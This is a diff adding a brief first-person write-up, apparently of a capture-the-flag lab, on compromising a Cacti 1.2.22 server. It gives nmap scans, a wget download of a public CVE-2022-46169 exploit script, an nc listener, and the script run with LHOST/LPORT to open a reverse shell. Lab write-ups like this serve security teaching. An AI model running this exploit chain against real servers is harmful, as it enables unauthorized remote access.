@@ -1,0 +1,7 @@
+I started with 'ping -c4 10.10.11.211' to make sure I had connection to target machine.
+Continued with 'nmap -p- 10.10.11.211' to find all open ports for further scanning.
+Next I used 'nmap -sVC -p22,80 10.10.11.211' to find out versions of services and headers to the web server.
+There is a login page running on cacti version 1.2.22. Looking at the source code there is a lot of JavaScript variables for some reason. No plain username or passwords thought. 
+Searching 'cacti 1.2.22 exploit' finds a github page that has 'CVE-2022-46169' exploit script for this cacti version.
+I downloaded it to my pc with 'wget https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py'.
+Started a nc listener with 'nc -lvnp 4444' and ran the script with 'python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.34 --LPORT=4444'.
